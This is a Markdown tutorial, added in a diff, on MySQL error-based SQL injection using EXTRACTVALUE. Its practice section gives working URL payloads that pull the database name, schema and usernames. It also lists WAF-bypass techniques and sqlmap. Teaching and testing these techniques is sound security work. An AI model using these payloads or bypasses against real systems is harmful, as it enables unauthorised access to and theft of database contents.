@@ -1,0 +1,139 @@
+---
+title: Exploit MYSQL Error Injection with Extractvalue
+description: Learn to exploit MYSQL Error-Based SQL Injection using the Extractvalue
+  function for sensitive data extraction.
+keywords:
+- MYSQL
+- Error Injection
+- Extractvalue function
+- SQL Injection
+- XPath Injection
+- database exploits
+- error-based SQL
+- display_errors
+- XPath syntax error
+- WAF bypass
+---
+
+# MYSQL Error Based - Extractvalue Function
+
+## Context
+
+This article focuses on exploiting MYSQL Error Based SQL Injection using the Extractvalue function. The objective is to leverage MYSQL's error messages that result from malformed XPath queries in order to extract sensitive information from a database. The reader is expected to be familiar with SQL syntax, XPath queries, error handling in MYSQL, and basic MYSQL Error Based injection techniques.
+
+## Theory
+
+### Extractvalue Function in MYSQL
+
+The `Extractvalue` function in MYSQL is a utility for extracting XML data through XPath expressions. By crafting queries that result in errors, attackers can induce MYSQL to reveal information inadvertently. This capability makes `Extractvalue` particularly useful for exploiting error-based SQL injection vulnerabilities. The typical attack sequence involves injecting malformed XPath queries, prompting MYSQL to generate error messages that may include sensitive data from the database.
+
+### Error-Based SQL Injection
+
+Error-based SQL injection is a technique whereby attackers exploit the error messages produced by a database to extract sensitive information. This is achieved by manipulating SQL queries in such a way that the database engine generates errors containing useful data. By carefully crafting these erroneous SQL statements, attackers can extract insights about the database structure and possibly access confidential data.
+
+### XPath Injection in MYSQL
+
+XPath Injection targets the execution of XPath queries within SQL statements. The vulnerability arises when applications integrate user input into XPath queries without proper validation or sanitization. In MYSQL, this can lead to SQL statements that, when executed, allow attackers to exploit XPath processing errors.
+
+### Prerequisites for Error-Based Injection
+
+For successful error-based injection using Extractvalue, several conditions must be met:
+- **MySQL version**: Compatible with Extractvalue function (MySQL 5.1+)
+- **Error display**: `display_errors=On` in PHP configuration or error logging enabled
+- **XPath errors**: MySQL must return XPath syntax errors in HTTP responses
+- **Injection context**: Vulnerable parameter in URL, form, or HTTP header
+- **Error visibility**: Error messages must be visible to the attacker (not suppressed by production settings)
+
+### Understanding XPath Error Messages
+
+When Extractvalue encounters malformed XPath, MySQL returns specific error messages:
+- **Format**: `XPATH syntax error: ':extracted_data'`
+- **Delimiter**: The `:` character separates the error message from the extracted data
+- **Data leakage**: Sensitive information appears after the colon in the error message
+
+## Practice
+
+### MYSQL Error Based SQL Injection using Extractvalue
+
+To perform an SQL injection using the Extractvalue function in a realistic web application context:
+
+1. **Identify Injectable Parameters:**
+   - Use Burp Suite to scan the web application for parameters vulnerable to SQL injection
+   - Test URL parameters, form fields, and HTTP headers systematically
+   - Look for parameters that interact with database queries
+
+2. **Test Basic Injection and Error Display:**
+   - First, verify that error messages are displayed by testing a simple injection:
+   ```http
+   http://example.com/page?id=1'
+   ```
+   - If you see MySQL error messages, proceed with Extractvalue technique
+   - If errors are suppressed, this technique may not work
+
+3. **Extract Database Name:**
+   - Inject the following payload to extract the current database name:
+   ```http
+   http://example.com/page?id=1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT database())))--
+   ```
+   - Look for error message: `XPATH syntax error: ':database_name'`
+
+4. **Extract Table Names:**
+   - Use this payload to extract the first table name:
+   ```http
+   http://example.com/page?id=1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 0,1)))--
+   ```
+   - Note: `information_schema` access may be restricted in MySQL 5.7+ or certain configurations
+
+5. **Extract Column Names:**
+   - Extract column names from a specific table:
+   ```http
+   http://example.com/page?id=1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 0,1)))--
+   ```
+
+6. **Extract Sensitive Data:**
+   - Extract actual data from tables:
+   ```http
+   http://example.com/page?id=1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT username FROM users LIMIT 0,1)))--
+   ```
+
+7. **Iterative Data Extraction:**
+   - Use `LIMIT` with different offsets to extract multiple records:
+   ```http
+   http://example.com/page?id=1' AND EXTRACTVALUE(1, CONCAT(0x3a, (SELECT username FROM users LIMIT 1,1)))--
+   ```
+
+#### Result
+
+By employing the Extractvalue function for error-based SQL injection, attackers can iteratively extract the database schema and potentially sensitive data through XPath error messages. This demonstrates the power and risk of error-based vulnerabilities when compounded with poor input sanitization and error handling.
+
+## Tools
+
+- **sqlmap**: A popular tool for automating SQL injection attacks, including techniques using the Extractvalue function.
+- **Burp Suite**: Provides manual testing capabilities for identifying and exploiting SQL injection vulnerabilities.
+- **OWASP ZAP**: Alternative web application security scanner for finding SQL injection vulnerabilities.
+- **Custom error analysis scripts**: Tools to parse and extract data from XPath error messages.
+
+## Common Challenges and Solutions
+
+### WAF Bypass Techniques
+
+When facing Web Application Firewalls that block Extractvalue:
+
+- **Alternative functions**: Use `UpdateXML()` instead of `Extractvalue()`
+- **Comment injection**: Use `/**/` to break up keywords: `EXTRACT/**/VALUE`
+- **Hex encoding**: Encode sensitive keywords in hexadecimal
+- **Case variation**: Mix uppercase and lowercase letters
+
+### Error Message Limitations
+
+- **Production environments**: Error messages are often suppressed
+- **Log analysis**: Check application logs instead of HTTP responses
+- **Time-based alternatives**: Use blind injection if errors are not visible
+- **Error suppression**: Some configurations prevent XPath errors from appearing
+
+### Optimization Techniques
+
+- **Batch extraction**: Use `GROUP_CONCAT()` to extract multiple values at once
+- **Substring extraction**: Use `SUBSTRING()` to extract data in chunks
+- **Error message parsing**: Automate the extraction of data from error messages
+- **Response analysis**: Monitor HTTP response codes and content length changes
